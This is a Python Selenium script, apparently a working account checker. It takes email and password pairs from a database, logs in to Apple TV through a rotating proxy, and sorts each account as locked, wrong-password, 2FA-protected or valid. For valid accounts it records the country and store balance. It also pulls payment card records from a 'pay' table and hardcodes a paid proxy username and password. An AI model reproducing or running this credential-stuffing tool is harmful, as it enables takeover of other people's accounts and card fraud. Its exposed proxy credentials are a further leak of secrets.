from const import *

def get_proxy():
    random_port = random.randint(9000, 9050)
    random_proxy = [
    {
        'proxy':  
            {
                'https': 'https://brd-customer-hl_d346dd25-zone-static-country-us:jmkokxul20oa@brd.superproxy.io:22225',
                'http': 'http://brd-customer-hl_d346dd25-zone-static-country-us:jmkokxul20oa@brd.superproxy.io:22225',
                'no_proxy': 'localhost,127.0.0.1'
            },
        'port': generate_random_port()
    
    },
    # {
    #     'proxy':  
    #         {
    #     'http': f'socks5://usa.rotating.proxyrack.net:{random_port}',
    #     'https': f'socks5://usa.rotating.proxyrack.net:{random_port}',
    #     'https': f'https://usa.rotating.proxyrack.net:{random_port}',
    #     'http': f'http://usa.rotating.proxyrack.net:{random_port}',
    #             'no_proxy': 'localhost,127.0.0.1'
    #         },
    #     'port': generate_random_port()
    # }
    ]
    option = random.choice(random_proxy)
    return option
def create_driver():
    chrome_options = Options()
    chrome_options.add_argument('--ignore-certificate-errors')
    chrome_options.add_argument('--allow-insecure-localhost')
    chrome_options.add_argument('--ignore-ssl-errors=yes')
    chrome_options.add_argument('--log-level=3')  # Selenium log level
    
    driver = uc.Chrome(
        service=Service(ChromeDriverManager().install()),
        options=chrome_options,
        seleniumwire_options=get_proxy(),
        service_log_path=os.path.devnull  # Chuyển hướng log của ChromeDriver
    )
    return driver
def get_account_apple_tv():
    data = db_instance.fetch_data(table_name="mail", columns=["*"], condition="loginCheck = 'Y' and isRunningLoginCheck = 'N' limit 1")
    db_instance.update_data(table_name="mail", set_values={"isRunningLoginCheck": "Y"}, condition="id = %s" % data[0][0])
    return data[0][0], data[0][1], data[0][2]

def get_card_info():
    data_card = db_instance.fetch_data(table_name="pay", columns=["*"], condition="status = 1 and on_use = 0 limit 1")
    db_instance.update_data(table_name="pay", set_values={"on_use": 1},condition=f'id = {data_card[0][0]}')
    return data_card[0][0], data_card[0][1], data_card[0][2]+""+ data_card[0][3], data_card[0][4], data_card[0][6]
    
def update_mail_re_run(id):
    db_instance.update_data(table_name="mail", set_values={"isRunningLoginCheck": "N"}, condition="id = %s" % id)
def run():    

    driver = create_driver()
    mail_id, gmail, password = get_account_apple_tv()
    # mail_id, gmail, password = 0, "11dvdfgfdgdfbcfbdfb@gmx.de", "Zxcv123123"
    exception = False
    try:    
        # if check_region(driver) == False:
        #     driver.quit()
        #     db_instance.insert_mail_tv_wait(gmail, password)
        #     return
        
        driver.get("https://tv.apple.com/login")
    except Exception as e:
        exception = True
    
    if exception == True:
        update_mail_re_run(mail_id)
        driver.quit()
        return    
    
    try:
        WebDriverWait(driver, 240).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="content-area"]/div/iframe')))
        iframe_login = driver.find_element(By.XPATH, '//*[@id="content-area"]/div/iframe')
        driver.switch_to.frame(iframe_login)
        WebDriverWait(driver, 240).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="accountName"]')))
        # Nhập tài khoản
        user_name = driver.find_element(By.XPATH, '//*[@id="accountName"]')
        user_name.send_keys(gmail)
        time.sleep(0.5)
        user_name.send_keys(Keys.ENTER)
        
        active = driver.switch_to.active_element
        active.send_keys(Keys.ENTER)
        time.sleep(10)
    except Exception as e:
        exception = True
    
    
    if exception == True:
        update_mail_re_run(mail_id)
        driver.quit()
        return
    # Nhập mật khẩu
    try:
        WebDriverWait(driver, 15).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="aid-auth-widget-iFrame"]')))
        driver.switch_to.frame(driver.find_element(By.XPATH, '//*[@id="aid-auth-widget-iFrame"]'))
        WebDriverWait(driver, 15).until(EC.visibility_of_element_located((By.TAG_NAME, 'input')))
        input_login = driver.find_elements(By.TAG_NAME, 'input')
        input_login[1].send_keys(password)
        driver.find_elements(By.TAG_NAME, 'button')[0].click()
    except Exception as e:
        exception = True
    
    if exception == True:
        update_mail_re_run(mail_id)
        driver.quit()
        return
    
    time.sleep(5)
    # Kiểm tra bị khoá hay bị block disable,...
    if check_account_is_block(driver):
        db_instance.insert_mail_check([mail_id, password,"UnLock",0])
        exception = True
        return
    
    if exception == True:
        driver.quit()
        return
    
    if check_account_login_invalid_password(driver):
        print("Sai pass")
        db_instance.insert_mail_check([mail_id, password,"sai pass",0])
        exception = True
        return
    
    if exception == True:
        driver.quit()
        return
    # Kiểm tra acc có otp 
    if check_account_has_otp(driver):
        db_instance.insert_mail_check([mail_id, password,"2FA",0])
        exception = True
        return
    
    if exception == True:
        driver.quit()
        return
    # Lần đầu login
    try:
        driver.switch_to.default_content()
        WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="content-area"]/div/iframe')))
        driver.switch_to.default_content()
        driver.switch_to.frame(driver.find_element(By.XPATH, '//*[@id="content-area"]/div/iframe'))
        WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="app"]/div/div/div/div/div/div/div/div/div[5]/button')))
        driver.find_element(By.XPATH, '//*[@id="app"]/div/div/div/div/div/div/div/div/div[5]/button').click()
        # else: 
        # WebDriverWait(driver, 15).until(EC.visibility_of_element_located((By.TAG_NAME, 'button')))
        # driver.find_element(By.TAG_NAME, 'button').click()
        time.sleep(5)
    except Exception as e:
        print('2 login')
    
    # Vào cài đặt và kiểm tra country
    try: 
        driver.switch_to.default_content()
        driver.get("https://tv.apple.com/settings")
        
        WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="content-area"]/div/iframe')))
        driver.switch_to.frame(driver.find_element(By.XPATH, '//*[@id="content-area"]/div/iframe'))
        WebDriverWait(driver, 30).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="app"]/div/div/div/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li')))
        country = driver.find_element(By.XPATH, '//*[@id="app"]/div/div/div/div/div/div/div/div[1]/div/div[2]/div/div[2]/div[3]/ul/li').text
        balance = driver.find_element(By.XPATH, '//*[@id="app"]/div/div/div/div/div/div/div/div[1]/div/div[2]/div/div[3]/div/ul/li').text
        # Lưu mail check
        db_instance.insert_mail_check([mail_id, password, country, float(balance.replace("$",""))])
    except Exception as e:
        exception = True
    
    if exception == True:
        update_mail_re_run(mail_id)
        driver.quit()
        return
    
    

def check_run_app():
    f = open ('./config/tool-config.json', "r")
    data = json.loads(f.read())
    f.close()
    return data['RUN']

   
if __name__ == "__main__":
    while check_run_app(): 
        print("Đang Login Check tài khoản Apple TV")
        print(check_run_app())   
        run()
        time.sleep(3)
    